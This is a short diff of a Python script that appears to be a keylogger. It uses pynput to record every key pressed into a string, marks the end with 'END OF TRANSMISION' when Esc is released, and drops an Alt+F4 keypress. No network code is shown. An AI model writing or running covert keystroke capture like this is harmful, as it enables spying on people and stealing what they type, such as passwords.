@@ -6,7 +6,7 @@ import ctypes
 
 message = ""
 
-def on_press(key, injected):
+def on_press(key):
     global message
     try:
         message = message + key.char
@@ -23,7 +23,7 @@ def on_press(key, injected):
         else:
             message += " " + str(key) + " "
 
-def on_release(key, injected):
+def on_release(key):
     global message
     if key == keyboard.Key.esc:
         message = message + "\n END OF TRANSMISION \n"
@@ -57,9 +57,5 @@ if __name__ == "__main__":
         keyboard_control.release(Key.down)
     asyncio.run(main())
     
-    with keyboard_control.pressed(Key.alt_l):
-        keyboard_control.press(Key.f4)
-        keyboard_control.release(Key.f4)
-
 
 
